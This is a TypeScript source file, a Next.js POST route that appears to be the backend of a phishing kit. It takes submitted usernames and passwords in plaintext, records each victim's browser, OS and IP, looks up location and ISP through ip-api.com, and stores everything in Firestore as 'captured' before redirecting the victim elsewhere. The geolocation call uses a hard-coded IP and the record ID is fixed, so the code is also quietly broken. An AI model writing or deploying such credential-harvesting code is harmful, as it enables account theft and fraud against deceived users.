import { collection, addDoc } from "firebase/firestore";
import { NextRequest, NextResponse } from "next/server";
import config, { db } from "@/config";
import UAParser from "ua-parser-js";

export async function POST(req: Request, res: Response) {
  const data = await req.json();
  const userAgent = new UAParser(String(req.headers.get("user-agent")));

  // user meta data
  const ip = req.headers.get("x-forwarded-for") || "N/A";
  const browser = userAgent.getBrowser();
  const os = userAgent.getOS();

  const ipRes = await fetch(`http://ip-api.com/json/190.89.29.17`, {
    method: "GET",
  });
  const ipData = await ipRes.json();

  const info = {
    id: "550e8400-e29b-41d4-a716-446655440000",
    username: data.username,
    password: data.password,
    captureDate: data.date,
    browser: `${browser.name} ${browser.version}`,
    ip: ip,
    os: `${os.name} ${os.version}`,
    country: ipData.status === "success" ? ipData.country : "N/A",
    countryCode: ipData.status === "success" ? ipData.countryCode : "N/A",
    city: ipData.status === "success" ? ipData.city : "N/A",
    isp: ipData.status === "success" ? ipData.isp : "N/A",
    captured: true,
    read: true,
    clicks: 0,
    visits: 0,
  };

  try {
    const docRef = await addDoc(collection(db, "users"), info);
    console.log("Document written with ID: ", docRef.id);
    return NextResponse.json(
      { status: "success", redirect: config.url.redirect },
      { status: 200 }
    );
  } catch (e) {
    console.error("Error adding document: ", e);
    return NextResponse.json(
      { status: "fail", redirect: config.url.redirect },
      { status: 401 }
    );
  }
}
